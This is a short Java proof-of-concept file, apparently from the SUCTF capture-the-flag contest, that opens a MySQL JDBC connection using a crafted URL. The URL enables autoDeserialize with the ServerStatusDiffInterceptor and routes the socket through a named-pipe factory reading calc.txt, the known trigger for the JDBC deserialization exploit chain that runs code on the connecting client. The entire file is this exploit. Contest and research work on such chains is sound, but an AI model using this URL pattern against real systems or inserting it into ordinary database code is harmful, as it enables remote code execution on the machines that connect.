package com.suctf;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Mysql_calc {
    public static void main(String[] args) throws SQLException {
        String url = "jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath=calc.txt";
        Connection connection = DriverManager.getConnection(url);
    }
}
